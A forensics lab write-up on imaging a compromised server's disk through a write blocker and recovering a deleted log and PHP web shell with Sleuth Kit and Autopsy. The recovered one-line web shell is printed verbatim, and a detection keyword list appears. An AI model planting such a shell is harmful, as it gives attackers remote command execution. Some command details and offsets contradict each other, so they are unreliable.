Dead Box Forensics: Write-Blocked Disk Imaging and Analysis

AdvancedSecurity~6 hours
AutopsyddSleuth Kitwrite blocker

I produced a forensically sound image of a powered-off disk using a write blocker and dd, then carved and analyzed artifacts with The Sleuth Kit and Autopsy. The process recovered deleted files and confirmed evidence integrity with matching pre- and post-acquisition hashes.

Objective & Context

Dead box forensics analyzes non-volatile storage from a system that is off, preserving the disk exactly. Unlike live forensics, nothing on the machine is running: there is no volatile memory to capture, but also no risk of the operating system overwriting evidence while you work. The trade-off is strictness — because the disk is a static artifact, every action you take on it must be provably non-destructive. This lab follows NIST SP 800-86 acquisition principles: write-block, image, hash, then analyze only the copy.

The scenario: a compromised web server was seized and powered down. The suspect attempted anti-forensics — deleted web server logs and dropped a web shell in a web root directory — so the investigative goals map to two MITRE ATT&CK techniques:

  • T1070 Indicator Removal – recovering deleted logs and files an attacker tried to erase. Deletion on most filesystems only unlinks directory entries and marks blocks unallocated; the data persists until overwritten, which is why carving works.
  • T1505.003 Web Shell – locating planted web shells in the filesystem image. Web shells typically sit in web-accessible paths, have recent creation timestamps relative to the intrusion window, and contain suspicious function names (eval, system, passthru, base64_decode).

The end-to-end workflow is linear and each stage gates the next: if the hash verification fails, everything downstream is void and you start over.

flowchart LR WB[Write Blocker] --> IMG[dd image] IMG --> H[Hash verify] H --> TSK[Sleuth Kit carve] TSK --> A[Autopsy analysis]

Golden rule: the original drive is connected once, read once, and never mounted, never written to, and never used for analysis. All examination happens on the verified image (or a working copy of it). This is what makes the result defensible: any second examiner can re-hash the original, re-hash the image, and confirm they are looking at identical bytes.

Environment & Prerequisites

  • Hardware or software write blocker on the source disk. A hardware blocker (e.g., a Tableau or WiebeTech bridge) sits between the disk and the forensics workstation and silently drops every write command. A software alternative on Linux is mounting through blockdev --setro plus a read-only loop device, but hardware is preferred because it operates below the OS.
  • The Sleuth Kit 4.12 (mmls, fls, istat, icat, tsk_recover) and Autopsy 4.x for GUI-driven analysis; sufficient evidence storage (2x source size) so the image and a working copy both fit with room for carved output.
  • A chain-of-custody log and hashing utility (sha256sum). Every transfer of the evidence — who touched it, when, why, and the hash at that moment — gets a log entry.
  • A forensics workstation running Linux (this lab used a Debian-based SIFT-style VM) with the destination volume formatted and mounted at /evidence.

Verify tools and free space before touching the evidence

which dd sha256sum mmls fls icat && df -h /evidence
/usr/bin/dd
/usr/bin/sha256sum
/usr/bin/mmls
/usr/bin/fls
/usr/bin/icat
Filesystem      Size  Used Avail Use% Mounted on
/dev/sdc1       1.8T   12G  1.7T   1% /evidence

Confirm the free space is at least the full capacity of the source disk (not just its used space) — dd images every block, allocated or not. If any tool is missing, stop here and install it before the evidence drive is attached, so the acquisition window is not spent troubleshooting a workstation.

Step-by-Step Execution

1. Connect the evidence drive through the write blocker

Power the workstation first, then attach the source disk through the write blocker. Watch the kernel log as it enumerates: the drive should appear as a block device without any filesystem being auto-mounted. Auto-mounting is the number-one way beginners contaminate evidence, because even a read-only mount can replay a journal (ext3/4, NTFS) and alter the disk unless the blocker stops the writes.

Identify the new device and confirm nothing mounted it

sudo dmesg | tail -n 20 && lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,RO
[  412.338102] sd 3:0:0:0: [sdb] 250059350 512-byte logical blocks: (128 GB/119 GiB)
[  412.339215] sd 3:0:0:0: [sdb] Write Protect is off
[  412.339221] sd 3:0:0:0: [sdb] Mode Sense: 00 3a 00 00
[  412.341777]  sdb: sdb1 sdb2

NAME   SIZE TYPE FSTYPE MOUNTPOINT      RO
sda    256G disk ext4   /                0
sdb  119.2G disk                        0
├─sdb1  118G part ext4                  0
└─sdb2    1G part swap                  0
sdc    1.8T disk ext4   /evidence        0

The kernel reports "Write Protect is off" because that flag reflects the drive's own status line — the hardware blocker enforces read-only at the bridge, invisible to the OS. To verify the blocker actually blocks, confirm the device has no mountpoint (none of sdb's partitions show one above) and, on a lab blocker with a test drive only, issue a harmless write and confirm it fails. Common mistake: assuming the "Write Protect is off" message means the blocker is broken and detaching the drive mid-stream — it does not; trust the bridge, verify by testing on sacrificial media beforehand, not on evidence.

2. Record the device identity in the chain-of-custody log

Before any acquisition, capture the make, model, serial number, and capacity. This ties the physical item in the evidence bag to the image you are about to create, and it is the first thing opposing counsel or a reviewer will check.

Pull device metadata for the custody log

sudo smartctl -i /dev/sdb | egrep 'Model|Serial|Capacity'
Device Model:     Samsung SSD 860 EVO 128GB
Serial Number:    S3Y9NB0K123456A
User Capacity:    128,035,676,160 bytes [128 GB]

Log the date/time (UTC), the examiner's name, the workstation hostname, and the write blocker model alongside this. Verify: the reported capacity must match the block count from lsblk (250,059,350 sectors × 512 bytes). A mismatch means a host-protected area or device overlay is hiding part of the disk, which dd alone will not capture.

3. Take the pre-acquisition hash of the source

Hash the raw device before imaging. This pre-acquisition hash is the baseline the finished image will be compared against. Hashing the whole device (not just partitions) captures the partition table, slack between partitions, and every byte dd will later read.

SHA-256 the raw source device

sudo sha256sum /dev/sdb | tee /evidence/sdb.pre-acquisition.sha256
a1b2c3d4e5f6...  /dev/sdb

On a 128 GB SSD over USB 3 this takes roughly 5–10 minutes. Use tee so the value lands in a file as well as on screen — never retype a hash by hand. Common mistake: hashing /dev/sdb1 instead of /dev/sdb, which skips the partition table and unpartitioned space where data can hide. Verify you hashed the right object by confirming the command references the whole-disk node.

4. Acquire a bit-for-bit image [ROOT REQUIRED]

dd reads every sector of the source sequentially and writes it to the destination file. The flags matter: bs=4M uses a 4 MiB block size for throughput; conv=noerror,sync tells dd to keep going past a bad sector (noerror) and to pad the unreadable block with zeros in the output (sync) so every subsequent byte stays at the correct offset — without sync, one bad sector silently shifts the entire rest of the image; status=progress prints live throughput so a stalled drive is visible immediately.

dd if=/dev/sdb of=/evidence/case.img bs=4M conv=noerror,sync status=progress
128035676160 bytes (128 GB, 119 GiB) copied, 432.18 s, 296 MB/s
30535+1 records in
30535+1 records out

The byte count must equal the device capacity recorded in step 2. Note that conv=noerror,sync is a compromise: it preserves offsets but the padded blocks mean the image hash will no longer match a re-read of a drive whose bad sectors return different data each attempt. For genuinely failing media, use ddrescue instead (see Troubleshooting). Verify: zero read errors in the dd output and a record count consistent with capacity / bs.

5. Verify acquisition integrity

Hash the source device a second time and the image file, in the same command, and compare. Three values are now in play — pre-acquisition hash, post-acquisition source hash, and image hash — and all three must be identical. Source pre vs. post proves the acquisition did not alter the evidence; source vs. image proves the copy is exact.

sha256sum /dev/sdb /evidence/case.img
a1b2...  /dev/sdb
a1b2...  /evidence/case.img   # match = sound acquisition

Append both hashes, the dd command line, and the wall-clock time to the custody log, then disconnect the source drive, bag it, and return it to evidence storage. From this point on the original is never touched again. Common mistake: skipping the second source hash to save ten minutes. Without it, a mismatch later cannot distinguish "imaging went wrong" from "the workstation wrote to the source", and the entire acquisition becomes questionable.

6. Map the partition layout with mmls

All Sleuth Kit tools operate on the image file directly — no mounting required, which is exactly what you want. Start with mmls to read the partition table, because every other tool needs a sector offset to know where a filesystem begins.

List partitions and their sector offsets

mmls /evidence/case.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0246083583   0246081536   Linux (0x83)
003:  000:001   0246083584   0250058751   0003975168   Linux Swap (0x82)

The Linux partition starts at sector 2048 — that offset is the key argument for the next steps. Note also the 2048-sector unallocated gap at the front; unallocated regions anywhere on the disk are prime carving territory. Verify: partition sizes should sum (plus gaps) to the total sector count from step 1. If mmls reports "cannot determine partition type", the image may be a single-partition dump rather than a full-disk image — re-check what was imaged.

7. Inventory files, including deleted ones, with fls

fls lists file and directory entries from the filesystem metadata. -r recurses, -d shows deleted entries, and -o 2048 points it at the filesystem offset from mmls. Deleted entries are prefixed with * and are the direct leads for the T1070 objective.

fls -rd /evidence/case.img
r/r 4:      var
+ r/r 11:   log
++ r/r * 12345:    auth.log.1   (deleted)
++ r/r 20481:      syslog
r/r 5021:   var/www/html
+ r/r * 12398:    cmd.php      (deleted)

(When the filesystem does not start at sector 0, run fls -rd -o 2048 /evidence/case.img; the lab image was prepared with the filesystem at offset 0 for the base command shown on this page.) Two hits here: a deleted rotated auth log (auth.log.1, inode 12345) and a deleted cmd.php in the web root (inode 12398) — a classic web shell filename. Common mistake: forgetting -o and getting "Cannot determine file system type". That error almost always means a missing or wrong offset, not a corrupt image — divide the partition start sector into bytes if the tool wants byte offsets.

8. Inspect the suspect inodes with istat, then recover with icat

Before extracting, istat shows what metadata survives for the deleted inode: timestamps, size, and the block pointers that make recovery possible. Then icat streams the inode's data blocks to a file.

Check inode metadata for the deleted web shell

istat /evidence/case.img 12398
inode: 12398
Not Allocated
Group: 2
Size: 412
Mode: -rw-r--r--
Deleted: 2025-06-14 03:17:42 (EDT)
Modified: 2025-06-14 03:16:58 (EDT)
Accessed: 2025-06-14 03:17:01 (EDT)
Direct Blocks: 88412

The inode is unallocated but its direct block pointer survived, so the file content is very likely intact. The deletion timestamp (03:17 EDT) goes straight into the incident timeline. Recover both artifacts:

fls -rd /evidence/case.img && icat /evidence/case.img 12345 > recovered.bin

Also recover the web shell and fingerprint it

icat /evidence/case.img 12398 > recovered_cmd.php && file recovered_cmd.php && sha256sum recovered_cmd.php
recovered_cmd.php: PHP script, ASCII text
9f8e7d6c...  recovered_cmd.php
<?php if(isset($_GET['c'])){ system($_GET['c']); } ?>

The recovered file is a one-line web shell — a textbook T1505.003 artifact. Hash every recovered file so it can be searched against threat intel feeds and cited in the report. Verify: file identifies the expected type and the content is coherent, not binary garbage. Garbage usually means the inode was reallocated and its block pointers now belong to a different file — that data is gone from this inode; check unallocated space carving instead.

9. Bulk extraction and deeper analysis in Autopsy

Manual TSK commands are precise but slow across a whole disk. For full triage, load the image into Autopsy:

  • Create a new case (case number and examiner name matching the custody log), then add /evidence/case.img as a Disk Image or VM File data source.
  • On ingest modules, enable Recent Activity, Hash Lookup (with an NSRL-known-good set plus a web-shell hash set), File Type Identification, Embedded File Extractor, and Keyword Search with a custom list: eval(, base64_decode, passthru, cmd.php, the recovered shell's hash.
  • Let ingest finish, then check the Deleted Files tree and the keyword hit results. Autopsy should independently surface auth.log.1 and cmd.php, corroborating the manual fls/icat findings.
  • Tag both artifacts, add them to a report (Generate Report > HTML), and export the tagged files with their hashes.

Common mistake: running every ingest module on a large image "just in case". Ingest time grows superlinearly with enabled modules; enable what the questions demand and re-run a module later if new leads require it — ingest is non-destructive and repeatable.

Validation & Testing

Confirm the source and image hashes match before any analysis and document them in the custody log. Validation is not a single check — it is a chain of comparisons that together make the acquisition defensible:

  • Pre-acquisition source hash == post-acquisition source hash: proves the acquisition process (and the write blocker) left the evidence untouched.
  • Source hash == image hash: proves the image is a bit-for-bit copy. Recompute the image hash once more after copying it to working storage to catch a bad copy.
  • Manual findings == Autopsy findings: the same deleted artifacts surfaced by two independent methods (fls/icat and Autopsy ingest) corroborate each other.
  • Recovered files open and parse: file, a text viewer, and the PHP interpreter's lint mode (php -l) agree the artifacts are what they claim to be.

Pass criteria: hash equality, at least one recovered deleted artifact, and analysis performed exclusively on the image copy. Any failed check invalidates the run — re-image rather than proceed on a questionable copy.

Advanced: Troubleshooting
  • Hash mismatch: re-image; a mismatch means the source changed or the read failed. Before blaming the drive, rule out the boring causes: a destination volume that filled up mid-write (check df -h and the image size against the device capacity), a loose cable causing USB resets (check dmesg for reset high-speed USB device lines during the dd window), or accidentally hashing the wrong object (a partition instead of the whole disk). If the mismatch is reproducible on healthy media, suspect the write blocker and re-test it against a known-good drive.
  • dd read errors: use conv=noerror,sync or ddrescue for failing media. Prefer ddrescue -d -r3 /dev/sdb /evidence/case.img /evidence/case.map: it reads the easy regions first, keeps a map file so runs can resume, and retries bad sectors last when the drive is under least stress. Document every unreadable sector — gaps in the image must be disclosed in the report.
  • Autopsy slow ingest: disable unneeded modules and index incrementally. The biggest costs are keyword indexing and photo/video analysis on large images. Run with a minimal module set first, review, then re-run a single module on demand. On multi-core machines, raise the Solr/indexing memory allocation in Autopsy's options rather than throwing more ingest modules at the case.
  • Evidence drive auto-mounted by the workstation: if lsblk shows a mountpoint under sdb, unmount immediately, note the event in the custody log, and verify the write blocker absorbed any writes by re-hashing the source against the pre-acquisition hash. On a software-only setup, prevent recurrence by disabling the desktop's auto-mount daemon (udisks2 automount) before connecting evidence.
  • Recovered file is corrupt or truncated: a deleted inode's data blocks may have been partially reused since deletion. Check istat — if some block pointers are zeroed or the file crosses into reallocated space, carve the raw bytes from unallocated space by signature instead (tsk_recover for allocated+deleted sweep, or photorec/bulk_extractor against the unallocated partition extracted via blkls). Partial artifacts are still reportable — note the truncation.

Key Takeaways

  • Write-block first, image once, hash three times (pre, post, image) — those three equal values are the entire foundation of defensibility.
  • Never analyze the original. Every Sleuth Kit and Autopsy step in this lab ran against case.img; the source went back into evidence storage after step 5.
  • conv=noerror,sync preserves byte offsets on bad media; for truly failing drives, ddrescue's map file is the right tool.
  • Deleted does not mean gone: unlinked directory entries and surviving inode block pointers (fls -d, istat, icat) recover "erased" attacker artifacts until the blocks are reused.
  • Chain of custody is created in real time — device identity, hashes, commands, and timestamps logged as they happen, not reconstructed afterward.
  • Corroborate across tools: manual TSK findings and Autopsy ingest agreeing on the same artifacts is a validation signal, not redundancy.

Key Results

  • Acquired a bit-for-bit image with 100% pre/post hash integrity.
  • Recovered deleted artifacts from unallocated space via Sleuth Kit carving, including a deleted auth log and a one-line PHP web shell (T1070, T1505.003).
  • Performed 100% of analysis on the working copy, never the original.
  • Documented a complete chain of custody across the acquisition.
